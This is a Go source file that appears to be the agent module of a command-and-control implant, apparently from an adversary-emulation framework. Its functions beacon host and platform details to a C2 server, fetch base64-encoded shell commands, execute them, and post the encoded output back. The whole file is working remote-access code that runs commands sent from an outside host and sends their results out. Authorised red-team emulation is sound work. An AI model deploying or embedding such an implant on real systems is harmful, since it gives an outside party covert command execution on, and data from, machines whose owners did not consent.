package modules

import (
	"bytes"
	"fmt"
	"net/http"
	"runtime"
	"io/ioutil"
	"time"
	"encoding/base64"
	"encoding/json"
)

// Beacon is a single call to the C2
func Beacon(server string, paw string, host string, group string) interface{} {
	data, _ := json.Marshal(map[string]string{"platform": runtime.GOOS, "host": host, "group": group})
	address := fmt.Sprintf("%s/sand/beacon", server)
	bites := request(address, paw, data)
	var out interface{}
	json.Unmarshal(bites, &out)
	return out
}

// Results is a POST request with a shell response
func Results(server string, paw string, c string) {
	command := unpack([]byte(c))
	cmd := string(decode(command["command"].(string)))
	status := "0"
	result, err := Execute(cmd)
	if err != nil {
		status = "1"
	}
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command["id"].(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(encode(result)), "status": status})
	request(address, paw, data)
	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
}

func request(address string, paw string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(encode(data)))
	req.Header.Set("X-PAW", paw)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return decode(string(body))
}

func encode(b []byte) []byte {
	return []byte(base64.StdEncoding.EncodeToString(b))
}

func decode(s string) []byte {
    raw, _ := base64.StdEncoding.DecodeString(s)
	return raw
}

func unpack(b []byte) (out map[string]interface{}) {
	_ = json.Unmarshal(b, &out)
	return
}
